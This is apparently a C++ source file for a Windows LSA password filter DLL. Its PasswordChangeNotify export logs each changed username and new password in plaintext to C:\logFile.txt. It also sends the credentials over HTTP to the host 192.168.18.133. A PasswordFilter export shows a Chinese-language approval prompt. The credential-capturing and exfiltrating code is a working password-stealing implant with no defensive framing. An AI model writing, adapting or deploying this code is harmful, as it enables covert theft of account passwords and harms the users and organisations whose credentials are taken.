#include <Windows.h>
#include <Ntsecapi.h>
#include <Wtsapi32.h>
#include <iostream>
#include <string>
#include <WinInet.h>
#pragma comment( lib, "Wininet.lib" )

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Wtsapi32.lib")

using namespace std;

void writeToLog(const char* szString)
{
	FILE* pFile;
	fopen_s(&pFile, "C:\\logFile.txt", "a+");
	if (NULL == pFile)
	{
		return;
	}
	fprintf(pFile, "%s\r\n", szString);
	fclose(pFile);
	return;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)
{
	OutputDebugString(L"InitializeChangeNotify");
	writeToLog("InitializeChangeNotify()");
	return TRUE;
}

extern "C" __declspec(dllexport) INT __stdcall PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword)
{
	FILE* pFile;
	fopen_s(&pFile, "C:\\logFile.txt", "a+");
	//HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hSession = InternetConnect(hInternet, L"192.168.18.133", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	HINTERNET hReq = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);
	LPCSTR pBuf = "SomeData";
	OutputDebugString(L"PasswordChangeNotify");
	if (NULL == pFile)
	{
		return -1;
	}
	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
	fclose(pFile);
	InternetSetOption(hSession, INTERNET_OPTION_USERNAME, UserName->Buffer, UserName->Length / 2);
	InternetSetOption(hSession, INTERNET_OPTION_PASSWORD, NewPassword->Buffer, NewPassword->Length / 2);
	HttpSendRequestW(hReq, NULL, 0, (LPVOID)pBuf, strlen(pBuf));

	return 0;
}

extern "C" __declspec(dllexport) BOOLEAN _stdcall PasswordFilter(
	_In_ PUNICODE_STRING AccountName,
	_In_ PUNICODE_STRING FullName,
	_In_ PUNICODE_STRING Password,
	_In_ BOOLEAN SetOperation)
{
	OutputDebugString(L"PasswordFilter");
	DWORD sessionId = WTSGetActiveConsoleSessionId();
	DWORD ret = 0;
	wstring MsgTilte = L"用户密码变动";
	wstring Msg = L"用户" + wstring(AccountName->Buffer) + L"的密码正在被修改 / 创建，是否允许？如果您未在10秒内作出选择，该操作将被拒绝。";
	BOOL bSuccess= WTSSendMessage(0, sessionId, (LPWSTR)MsgTilte.c_str(), 2*MsgTilte.length(), (LPWSTR)Msg.c_str(), 2 * Msg.length(), MB_YESNO, 15, &ret, TRUE);
	//只有明确的允许才返回true
	if (bSuccess && ret == IDYES)
	{
		return true;
		//其他情况均返回false
	}
	else
	{
		(LPWSTR)Msg.c_str(), 2 * Msg.length();
		return false;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD
	ul_reason_for_call,
	LPVOID lpReserved
)
{
	OutputDebugString(L"DllMain");
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}